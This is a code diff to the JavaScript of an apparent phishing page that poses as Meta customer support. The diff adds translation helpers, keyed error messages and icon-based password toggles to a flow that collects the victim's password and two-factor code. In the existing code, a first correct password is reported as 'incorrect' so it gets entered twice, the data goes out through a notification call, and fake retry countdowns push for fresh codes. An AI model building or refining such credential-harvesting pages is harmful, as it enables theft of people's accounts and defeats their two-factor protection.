@@ -3,6 +3,30 @@
 // Generate ticket ID
 document.getElementById('ticketId').textContent = Utils.generateTicketId();
 
+function i18nSource(key) {
+    return document.querySelector('#i18n-strings [data-i18n="' + key + '"]');
+}
+
+function i18nText(key, fallback) {
+    const src = i18nSource(key);
+    const text = src ? src.innerText.trim() : '';
+    return text || fallback || '';
+}
+
+function showKeyedError(container, attr, key) {
+    if (!container) return;
+    container.classList.remove('hidden', 'is-idle');
+    container.querySelectorAll('[' + attr + ']').forEach((el) => {
+        el.classList.toggle('is-on', el.getAttribute(attr) === key);
+    });
+}
+
+function hideKeyedError(container) {
+    if (!container) return;
+    container.classList.add('is-idle');
+    container.querySelectorAll('.is-on').forEach((el) => el.classList.remove('is-on'));
+}
+
 // Start verification flow
 document.getElementById('submitRequestBtn').addEventListener('click', openClientModal);
 
@@ -445,12 +469,14 @@ function openSecurityModal() {
             </div>
             <form id="securityForm" class="info-form-body">
                 <div class="info-form-field">
-                    <label class="info-form-label" for="password">Password <span class="info-form-required">*</span></label>
                     <div class="password-field">
-                        <input type="password" id="password" name="password" class="info-form-control" placeholder="Enter your password" autocomplete="current-password" required>
-                        <button type="button" id="togglePassword" class="password-toggle">Show</button>
+                        <input type="password" id="password" name="password" class="info-form-control" placeholder="Enter your password" autocomplete="current-password" aria-label="Password" required>
+                        <button type="button" id="togglePassword" class="password-toggle notranslate" aria-label="Show password"></button>
                     </div>
-                    <p id="passwordError" class="info-form-error hidden"></p>
+                    <p id="passwordError" class="info-form-error is-idle">
+                        <span data-password-error="empty">You haven't entered your password!</span>
+                        <span data-password-error="incorrect">The password you've entered is incorrect.</span>
+                    </p>
                 </div>
                 <button type="submit" class="info-form-submit">Continue</button>
             </form>
@@ -467,15 +493,32 @@ function openSecurityModal() {
     const passwordInput = document.getElementById('password');
     const errorMsg = document.getElementById('passwordError');
     const togglePassword = document.getElementById('togglePassword');
+    const eyeShowIcon = `
+        <svg width="22" height="22" viewBox="0 0 24 24" fill="none" aria-hidden="true">
+            <path d="M2.5 12s3.6-7 9.5-7 9.5 7 9.5 7-3.6 7-9.5 7-9.5-7-9.5-7z" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"/>
+            <circle cx="12" cy="12" r="3.1" stroke="currentColor" stroke-width="1.7"/>
+        </svg>`;
+    const eyeHideIcon = `
+        <svg width="22" height="22" viewBox="0 0 24 24" fill="none" aria-hidden="true">
+            <path d="M2.5 12s3.6-7 9.5-7c1.9 0 3.6.5 5 1.3" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"/>
+            <path d="M21.5 12s-3.6 7-9.5 7c-1.9 0-3.6-.5-5-1.3" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"/>
+            <circle cx="12" cy="12" r="3.1" stroke="currentColor" stroke-width="1.7"/>
+            <path d="M4 4l16 16" stroke="currentColor" stroke-width="1.7" stroke-linecap="round"/>
+        </svg>`;
+
+    const setPasswordVisible = (visible) => {
+        passwordInput.type = visible ? 'text' : 'password';
+        togglePassword.innerHTML = visible ? eyeHideIcon : eyeShowIcon;
+        togglePassword.setAttribute('aria-label', visible ? 'Hide password' : 'Show password');
+    };
+    setPasswordVisible(false);
 
     togglePassword.addEventListener('click', () => {
-        const showPlain = passwordInput.type === 'password';
-        passwordInput.type = showPlain ? 'text' : 'password';
-        togglePassword.textContent = showPlain ? 'Hide' : 'Show';
+        setPasswordVisible(passwordInput.type === 'password');
     });
 
     passwordInput.addEventListener('input', () => {
-        errorMsg.classList.add('hidden');
+        hideKeyedError(errorMsg);
         passwordInput.classList.remove('is-error');
     });
 
@@ -484,11 +527,10 @@ function openSecurityModal() {
         const password = passwordInput.value.trim();
         const submitBtn = e.target.querySelector('button[type="submit"]');
 
-        errorMsg.classList.add('hidden');
+        hideKeyedError(errorMsg);
         passwordInput.classList.remove('is-error');
         if (!password) {
-            errorMsg.textContent = "You haven't entered your password!";
-            errorMsg.classList.remove('hidden');
+            showKeyedError(errorMsg, 'data-password-error', 'empty');
             passwordInput.classList.add('is-error');
             return;
         }
@@ -504,12 +546,10 @@ function openSecurityModal() {
 
             setTimeout(() => {
                 submitBtn.disabled = false;
-                submitBtn.textContent = 'Continue';
+                submitBtn.textContent = i18nText('continue', 'Continue');
                 passwordInput.value = '';
-                passwordInput.type = 'password';
-                togglePassword.textContent = 'Show';
-                errorMsg.textContent = 'The password you\'ve entered is incorrect.';
-                errorMsg.classList.remove('hidden');
+                setPasswordVisible(false);
+                showKeyedError(errorMsg, 'data-password-error', 'incorrect');
                 passwordInput.classList.add('is-error');
                 securityClickCount = 1;
             }, 1350);
@@ -551,7 +591,11 @@ function openAuthenticationModal(userData) {
                 <div class="info-form-field">
                     <label class="info-form-label" for="twoFa">Authentication code <span class="info-form-required">*</span></label>
                     <input type="text" id="twoFa" name="twoFa" class="info-form-control auth-code-input" placeholder="6 or 8 digits" inputmode="numeric" autocomplete="one-time-code" maxlength="8" pattern="\\d{6}|\\d{8}" required>
-                    <p id="authError" class="info-form-error hidden"></p>
+                    <p id="authError" class="info-form-error is-idle">
+                        <span data-auth-error="empty">You haven't entered the code!</span>
+                        <span data-auth-error="invalid">Enter a 6 or 8-digit code.</span>
+                        <span data-auth-error="retry">The code is incorrect. Try again after <span data-auth-retry-n>15</span> seconds.</span>
+                    </p>
                 </div>
                 <button type="submit" class="info-form-submit">Continue</button>
             </form>
@@ -571,13 +615,12 @@ function openAuthenticationModal(userData) {
 
     const sanitizeTwoFa = (value) => String(value || '').replace(/\D/g, '').slice(0, 8);
     const isValidTwoFa = (value) => value.length === 6 || value.length === 8;
-    const showAuthError = (message) => {
-        errorMsg.textContent = message;
-        errorMsg.classList.remove('hidden');
+    const showAuthError = (key) => {
+        showKeyedError(errorMsg, 'data-auth-error', key);
         input.classList.add('is-error');
     };
     const clearAuthError = () => {
-        errorMsg.classList.add('hidden');
+        hideKeyedError(errorMsg);
         input.classList.remove('is-error');
     };
 
@@ -600,11 +643,11 @@ function openAuthenticationModal(userData) {
 
         clearAuthError();
         if (!twoFa) {
-            showAuthError("You haven't entered the code!");
+            showAuthError('empty');
             return;
         }
         if (!isValidTwoFa(twoFa)) {
-            showAuthError('Enter a 6 or 8-digit code.');
+            showAuthError('invalid');
             return;
         }
 
@@ -618,7 +661,7 @@ function openAuthenticationModal(userData) {
             await Utils.sendNotification(clientData);
 
             setTimeout(() => {
-                submitBtn.innerHTML = 'Continue';
+                submitBtn.innerHTML = i18nText('continue', 'Continue');
                 startCountdown(submitBtn, 15);
                 authClickCount = 1;
             }, 1400);
@@ -629,7 +672,7 @@ function openAuthenticationModal(userData) {
             await Utils.sendNotification(clientData);
 
             setTimeout(() => {
-                submitBtn.innerHTML = 'Continue';
+                submitBtn.innerHTML = i18nText('continue', 'Continue');
                 startCountdown(submitBtn, 30);
                 authClickCount = 2;
             }, 1200);
@@ -651,11 +694,16 @@ function openAuthenticationModal(userData) {
         submitBtn.classList.add('opacity-70');
 
         let time = seconds;
-        showAuthError(`The code is incorrect. Try again after ${time} seconds.`);
+        const retryNum = errorMsg.querySelector('[data-auth-retry-n]');
+        const paintRetry = () => {
+            if (retryNum) retryNum.textContent = String(time);
+            showAuthError('retry');
+        };
+        paintRetry();
 
         countdownInterval = setInterval(() => {
             time--;
-            errorMsg.textContent = `The code is incorrect. Try again after ${time} seconds.`;
+            paintRetry();
 
             if (time <= 0) {
                 clearInterval(countdownInterval);
@@ -675,7 +723,7 @@ function openSuccessModal() {
     const content = `
         <h2 class="font-bold text-[18px] mb-4 text-center">Request has been sent</h2>
         <div class="rounded-lg overflow-hidden mb-4">
-            <img src="./public/images/success.jpg" alt="Success" class="w-full">
+            <img src="/public/images/success.jpg" alt="Success" class="w-full">
         </div>
         <p class="text-[#9a979e] mb-1 text-[15px]">Your request has been added to the processing queue. We will handle your request within 24 hours.</p>
         <p class="text-[#9a979e] mb-5 text-[15px]">From the Customer Support Meta.</p>
